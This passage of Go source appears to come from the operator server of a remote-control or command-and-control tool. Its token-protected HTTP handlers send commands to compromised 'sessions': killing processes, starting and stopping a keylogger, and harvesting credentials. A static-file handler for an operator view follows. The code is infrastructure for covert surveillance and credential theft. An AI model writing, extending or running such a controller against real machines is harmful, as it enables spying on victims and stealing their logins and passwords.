		SessionID string `json:"session_id"`
		PID       string `json:"pid"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" || req.PID == "" {
		http.Error(w, "bad request: need session_id and pid", http.StatusBadRequest)
		return
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{
		Type: common.CmdProcessKill,
		Args: map[string]string{"pid": req.PID},
	})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	appendAuditJSONL(r, "prockill", ev.SessionID, req.PID)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

func handleOpKeylogStart(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
		return
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdKeylogStart, Args: map[string]string{}})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	appendAuditJSONL(r, "keylog_start", ev.SessionID, "")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

func handleOpKeylogStop(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
		return
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdKeylogStop, Args: map[string]string{}})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	appendAuditJSONL(r, "keylog_stop", ev.SessionID, "")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

func handleOpCreds(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
		return
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdCreds, Args: map[string]string{}})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

// handleView serves static files from ../view.
func handleView(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	cwd, _ := os.Getwd()
	viewDir := filepath.Join(cwd, "..", "view")
	path := strings.TrimPrefix(r.URL.Path, "/view")
	path = strings.TrimPrefix(path, "/")
	if path == "" {
		path = "index.html"
	}
	fpath := filepath.Join(viewDir, path)
	if strings.Contains(path, "..") {
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}
	info, err := os.Stat(fpath)
	if err != nil {
		if os.IsNotExist(err) {
			http.NotFound(w, r)
			return
		}
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	if info.IsDir() {
		// try index.html inside the dir
		fpath = filepath.Join(fpath, "index.html")
		info, err = os.Stat(fpath)
		if err != nil || info.IsDir() {
			http.NotFound(w, r)
			return
		}
	}
	http.ServeFile(w, r, fpath)
}
